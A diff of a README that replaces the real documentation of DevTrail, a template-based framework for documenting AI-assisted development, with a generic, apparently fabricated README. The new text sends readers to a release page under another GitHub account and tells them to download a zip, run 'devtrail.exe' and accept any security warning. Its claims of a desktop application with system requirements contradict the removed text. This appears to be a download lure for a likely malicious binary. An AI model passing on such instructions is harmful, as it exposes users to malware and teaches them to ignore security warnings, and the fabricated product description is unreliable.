@@ -1,452 +1,66 @@
-<div align="center">
+# 🚀 devtrail - Simplifying AI Development for Everyone
 
-# DevTrail
+[![Download devtrail](https://img.shields.io/badge/Download-devtrail-blue.svg)](https://github.com/Technophile522/devtrail/releases)
 
-**Documentation Governance for AI-Assisted Software Development**
+## 📖 About devtrail
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
-[![Handbook](https://img.shields.io/badge/docs-Handbook-orange.svg)](https://enigmora.github.io/devtrail/)
-[![Enigmora](https://img.shields.io/badge/by-Enigmora-purple.svg)](https://enigmora.com)
+devtrail is a tool designed to help you manage documentation for AI-assisted development. This framework guides developers in creating clear, organized, and traceable documentation. Whether you're a seasoned developer or just starting out, devtrail makes it easy to enhance your projects with well-structured documents.
 
-[Getting Started](#getting-started) •
-[Features](#features) •
-[Documentation](#documentation) •
-[Contributing](#contributing)
+## 🛠️ Features
 
-**Languages**: English | [Español](i18n/es/README.md)
+- **Documentation Governance:** Ensure your documentation meets industry standards.
+- **AI Integration:** Utilize AI tools to improve your documentation process.
+- **Template Repository:** Access ready templates for quick starts.
+- **Traceability:** Keep track of changes and maintain clear project histories.
 
-</div>
+## 🏁 Getting Started
 
----
+To download and run devtrail, follow these steps:
 
-## The Problem
+1. **Visit the Release Page**  
+   Click the following link to go to the releases page: [Download devtrail](https://github.com/Technophile522/devtrail/releases). This page contains the latest version of the software.
 
-As AI coding assistants become integral to software development, a critical gap emerges:
+2. **Download the Latest Version**  
+   On the releases page, look for the most recent version. You will see various downloadable files. Click the link that reads something like `devtrail-vX.X.X.zip` or a similar file to download the software.
 
-- **Who made this change?** Was it a developer or an AI assistant?
-- **Why was this decision made?** What alternatives were considered?
-- **Should this have been reviewed?** Was human oversight appropriate?
-- **What's the impact?** How risky is this change?
+3. **Unzip the Downloaded File**  
+   After the download completes, locate the ZIP file in your computer's downloads folder. Right-click on the file and choose "Extract All" or "Unzip" to decompress the contents.
 
-Without structured documentation, AI-assisted development becomes a black box.
+4. **Run devtrail**  
+   After unzipping, open the folder created by the extraction. Look for a file named `devtrail.exe` or similar. Double-click this file to launch the application. If prompted with a security warning, select "Run".
 
-## The Solution
+## 💻 System Requirements
 
-DevTrail provides a **documentation governance system** that ensures:
+Before running devtrail, ensure your system meets the following requirements:
 
-> **"No significant change without a documented trace."**
+- **Operating System:** Windows 10 or later; macOS 10.14 or later; Linux (Ubuntu or Debian).
+- **RAM:** Minimum 4 GB; recommended 8 GB or more.
+- **Disk Space:** At least 200 MB of free storage.
+- **Processor:** 1 GHz or faster.
 
-Every meaningful change—whether by human or AI—is documented, attributed, and reviewable.
+## 💡 Usage Tips
 
----
+- **Choose Templates Wisely:** When starting a new project, select a documentation template that matches your needs. This will save time and improve clarity.
+- **Utilize AI Features:** Take advantage of AI-powered suggestions to enhance your documentation. This can help you catch errors and improve language quality.
+- **Keep Projects Organized:** Use folders and categories to organize your documentation files efficiently.
 
-## Features
+## 🥳 Community and Support
 
-### 📋 Structured Documentation
+For questions or support, you can join our community. 
 
-Eight document types covering the full development lifecycle:
+- **Discussion Forum:** Engage with other users at our dedicated forum.
+- **Contact Us:** If you encounter problems, feel free to reach out through our GitHub page with your queries.
 
-| Type | Purpose | Example |
-|------|---------|---------|
-| **REQ** | Requirements | System requirements, user stories |
-| **ADR** | Architecture Decisions | Technology choices, design patterns |
-| **TES** | Test Plans | Test strategies, coverage goals |
-| **INC** | Incident Post-mortems | Root cause analysis, lessons learned |
-| **TDE** | Technical Debt | Identified debt, remediation plans |
-| **AILOG** | AI Action Logs | What AI assistants did and why |
-| **AIDEC** | AI Decisions | Choices made by AI with alternatives |
-| **ETH** | Ethical Reviews | Privacy, bias, responsible AI |
+## 📄 License
 
-### 🤖 AI Agent Support
+devtrail is licensed under the MIT License. You can use, modify, and distribute the software freely, as long as you include the original license with your distribution.
 
-Pre-configured for popular AI coding assistants:
+## 🔗 More Information
 
-- **Claude Code** (Anthropic) → `CLAUDE.md`
-- **Cursor** → `.cursorrules`
-- **GitHub Copilot CLI** → `.github/copilot-instructions.md`
-- **Gemini CLI** (Google) → `GEMINI.md`
+For detailed guides, tutorials, and more information about devtrail, visit the documentation section on our GitHub repository.
 
-Each configuration instructs the AI to:
-- Identify itself in every document
-- Declare confidence levels
-- Request human review when appropriate
-- Follow naming conventions
-- **Follow Git branching strategy** (never commit to `main` directly)
+## 💾 Download & Install
 
-### 👁️ Human Oversight
+To start using devtrail today, visit this page to download: [Download devtrail](https://github.com/Technophile522/devtrail/releases). Follow the steps above to install and run the software easily.
 
-Built-in safeguards ensure humans stay in control:
-
-- **Autonomy levels**: Some document types require human approval
-- **Review triggers**: Low confidence or high risk → mandatory review
-- **Ethical reviews**: Privacy and bias concerns flagged for human decision
-
-### ✅ Validation & CI/CD
-
-Automated validation tools:
-
-- **Pre-commit hooks** (Bash) - Validate before commit
-- **PowerShell script** - Windows-friendly validation
-- **GitHub Actions** - PR validation workflow
-
----
-
-## Getting Started
-
-### Quick Start (New Project)
-
-**Option 1: Use as Template** (Recommended)
-
-Click the **"Use this template"** button above to create a new repository with DevTrail pre-configured.
-
-**Option 2: Clone and Copy**
-
-```bash
-# Clone DevTrail
-git clone https://github.com/enigmora/devtrail-framework.git
-
-# Copy to your project
-cp -r devtrail-framework/.devtrail your-project/
-cp devtrail-framework/CLAUDE.md your-project/
-cp devtrail-framework/GEMINI.md your-project/
-cp devtrail-framework/.cursorrules your-project/
-cp -r devtrail-framework/.github your-project/
-cp -r devtrail-framework/scripts your-project/
-```
-
-### Quick Start (Existing Project)
-
-```bash
-# Download DevTrail
-git clone https://github.com/enigmora/devtrail-framework.git devtrail-temp
-
-# Copy without overwriting (Linux/Mac)
-cp -rn devtrail-temp/.devtrail ./
-cp -n devtrail-temp/CLAUDE.md ./
-cp -n devtrail-temp/GEMINI.md ./
-cp -n devtrail-temp/.cursorrules ./
-cp -rn devtrail-temp/.github ./
-cp -rn devtrail-temp/scripts ./
-
-# Clean up
-rm -rf devtrail-temp
-
-# Commit
-git add .devtrail/ CLAUDE.md GEMINI.md .cursorrules .github/ scripts/
-git commit -m "chore: adopt DevTrail"
-```
-
-📖 **See [ADOPTION-GUIDE.md](ADOPTION-GUIDE.md) for detailed instructions, migration strategies, and team rollout plans.**
-
----
-
-## Documentation
-
-### Quick Reference
-
-```
-.devtrail/
-├── 00-governance/           # Policies and rules
-├── 01-requirements/         # REQ documents
-├── 02-design/decisions/     # ADR documents
-├── 03-implementation/       # Implementation guides (incl. Git strategy)
-├── 04-testing/              # TES documents
-├── 05-operations/incidents/ # INC documents
-├── 06-evolution/technical-debt/ # TDE documents
-├── 07-ai-audit/
-│   ├── agent-logs/          # AILOG documents
-│   ├── decisions/           # AIDEC documents
-│   └── ethical-reviews/     # ETH documents
-└── templates/               # Document templates
-```
-
-### Naming Convention
-
-```
-[TYPE]-[YYYY-MM-DD]-[NNN]-[description].md
-```
-
-Example: `ADR-2025-01-27-001-use-postgresql-for-persistence.md`
-
-### Key Documents
-
-| Document | Description |
-|----------|-------------|
-| [**📘 Handbook**](https://enigmora.github.io/devtrail/) | Complete online documentation |
-| [ADOPTION-GUIDE.md](ADOPTION-GUIDE.md) | Adoption guide for new/existing projects |
-| [docs/cookbook.md](docs/cookbook.md) | Practical examples and scenarios |
-| [.devtrail/QUICK-REFERENCE.md](.devtrail/QUICK-REFERENCE.md) | One-page reference card |
-
----
-
-## How It Works
-
-### 1. AI Makes a Change
-
-An AI assistant working on your code automatically:
-
-```yaml
-# Creates: .devtrail/07-ai-audit/agent-logs/AILOG-2025-01-27-001-implement-auth.md
----
-id: AILOG-2025-01-27-001
-title: Implement JWT authentication
-agent: claude-code-v1.0
-confidence: high
-risk_level: high
-review_required: true
----
-```
-
-### 2. Human Reviews (When Needed)
-
-High-risk or low-confidence changes are flagged:
-
-```
-📋 AILOG-2025-01-27-001-implement-auth.md
-   Agent: claude-code-v1.0
-   Confidence: high
-   Risk Level: high ⚠️
-   Review Required: YES
-```
-
-### 3. Decisions Are Preserved
-
-When choosing between alternatives, decisions are documented:
-
-```yaml
-# Creates: .devtrail/07-ai-audit/decisions/AIDEC-2025-01-27-001-auth-strategy.md
----
-id: AIDEC-2025-01-27-001
-title: Choose JWT over session-based auth
-alternatives_considered:
-  - JWT tokens (chosen)
-  - Session cookies
-  - OAuth only
-justification: "Stateless architecture requirement..."
----
-```
-
-### 4. Ethical Concerns Are Flagged
-
-When AI encounters ethical considerations:
-
-```yaml
-# Creates: .devtrail/07-ai-audit/ethical-reviews/ETH-2025-01-27-001-user-data.md
----
-id: ETH-2025-01-27-001
-title: User data collection scope
-status: draft  # Requires human approval
-review_required: true
-concerns:
-  - GDPR compliance
-  - Data minimization
----
-```
-
----
-
-## Validation
-
-### Pre-commit Hook
-
-```bash
-# Install the pre-commit hook
-cp scripts/pre-commit-docs.sh .git/hooks/pre-commit
-chmod +x .git/hooks/pre-commit
-```
-
-### Manual Validation
-
-```bash
-# Linux/Mac
-bash scripts/pre-commit-docs.sh
-
-# Windows PowerShell
-.\scripts\validate-docs.ps1
-```
-
-### GitHub Actions
-
-The included workflow (`.github/workflows/docs-validation.yml`) automatically validates:
-- File naming conventions
-- Required metadata fields
-- Sensitive information detection
-- Markdown formatting
-- Internal link integrity
-
----
-
-## Skills
-
-DevTrail includes skills for AI agents that enable **active documentation creation**.
-
-> **Binary System**: DevTrail uses a passive system (agents auto-document via context instructions) and an active system (users invoke skills to create documentation manually or when the agent missed something).
-
-### Available Skills
-
-| Skill | Purpose | Claude | Gemini |
-|-------|---------|--------|--------|
-| `/devtrail-status` | Check documentation compliance | ✅ | ✅ |
-| `/devtrail-new` | Create any document type (unified) | ✅ | ✅ |
-| `/devtrail-ailog` | Quick AILOG creation | ✅ | ✅ |
-| `/devtrail-aidec` | Quick AIDEC creation | ✅ | ✅ |
-| `/devtrail-adr` | Quick ADR creation | ✅ | ✅ |
-
-### Usage Examples
-
-```bash
-# Check documentation status
-/devtrail-status
-
-# Create documentation (agent suggests type)
-/devtrail-new
-
-# Force specific document type
-/devtrail-new ailog
-
-# Direct shortcuts
-/devtrail-ailog
-/devtrail-aidec
-/devtrail-adr
-```
-
-### Shell Scripts (Manual Use)
-
-For users who prefer command-line or use agents without skill support:
-
-```bash
-# Interactive document creation
-./scripts/devtrail-new.sh
-
-# Create specific type directly
-./scripts/devtrail-new.sh ailog
-
-# Check documentation status
-./scripts/devtrail-status.sh
-```
-
-
-### Agent Reporting
-
-AI agents report documentation status at the end of each task:
-
-| Status | Meaning |
-|--------|---------|
-| `DevTrail: Created AILOG-...` | Documentation was created |
-| `DevTrail: No documentation required` | Change was minor (<10 lines) |
-| `DevTrail: Documentation pending` | May need manual review |
-
-### Multi-Agent Architecture
-
-DevTrail provides native skill support for multiple AI agents through a layered architecture:
-
-```
-your-project/
-├── .agent/workflows/       # 🌐 Agnostic (Antigravity, future agents)
-│   ├── devtrail-new.md
-│   ├── devtrail-status.md
-│   └── ...
-├── .gemini/skills/         # 🔵 Gemini CLI (Google)
-│   ├── devtrail-new/SKILL.md
-│   └── ...
-└── .claude/skills/         # 🟣 Claude Code (Anthropic)
-    ├── devtrail-new/SKILL.md
-    └── ...
-```
-
-| Directory | Agent | Product | Format |
-|-----------|-------|---------|--------|
-| `.agent/workflows/` | Antigravity, generic | VS Code/Cursor extensions | `skill-name.md` with YAML frontmatter |
-| `.gemini/skills/` | Gemini CLI | Google's terminal CLI | `skill-name/SKILL.md` |
-| `.claude/skills/` | Claude Code | Anthropic's coding agent | `skill-name/SKILL.md` |
-
-> **Note**: `.agent/` is the **vendor-agnostic** standard. Agent-specific directories (`.gemini/`, `.claude/`) provide compatibility for those platforms while following their native conventions.
-
-All skill implementations are **functionally identical**—only the format differs to match each agent's requirements.
-
----
-
-## Supported Platforms
-
-### AI Coding Assistants
-
-| Platform | Config File | Status |
-|----------|-------------|--------|
-| Claude Code | `CLAUDE.md` | ✅ Full support |
-| Cursor | `.cursorrules` | ✅ Full support |
-| GitHub Copilot CLI | `.github/copilot-instructions.md` | ✅ Full support |
-| Gemini CLI | `GEMINI.md` | ✅ Full support |
-
-### Operating Systems
-
-| OS | Validation Script |
-|----|-------------------|
-| Linux | `scripts/pre-commit-docs.sh` |
-| macOS | `scripts/pre-commit-docs.sh` |
-| Windows | `scripts/validate-docs.ps1` |
-
-### CI/CD Platforms
-
-| Platform | Support |
-|----------|---------|
-| GitHub Actions | ✅ Included workflow |
-| GitLab CI | 🔧 Adaptable from GitHub Actions |
-| Azure DevOps | 🔧 Adaptable from GitHub Actions |
-
----
-
-## Standards Alignment
-
-DevTrail aligns with:
-
-- **ADR** (Architecture Decision Records) - Native support
-- **IEEE 830** - Requirements documentation structure
-- **ISO/IEC 25010** - Quality attributes in ADRs
-- **GDPR** - Privacy impact documentation (ETH)
-- **EU AI Act** - AI transparency and human oversight
-- **NIST AI RMF** - Risk documentation
-
----
-
-## Contributing
-
-We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-### Ways to Contribute
-
-- 🐛 Report bugs
-- 💡 Suggest features
-- 📖 Improve documentation
-- 🔧 Submit pull requests
-- 🌍 Add translations
-
----
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-## About Enigmora
-
-<div align="center">
-
-<img src="assets/logo-enigmora.svg" alt="Enigmora Logo" width="60">
-
-**[Enigmora](https://enigmora.com)** builds tools for responsible AI-assisted software development.
-
-[Website](https://enigmora.com) • [GitHub](https://github.com/enigmora)
-
-</div>
-
----
-
-<div align="center">
-
-**DevTrail** — Because every change tells a story.
-
-[⬆ Back to top](#enigmora-devtrail-framework)
-
-</div>
+Enjoy better documentation with devtrail!
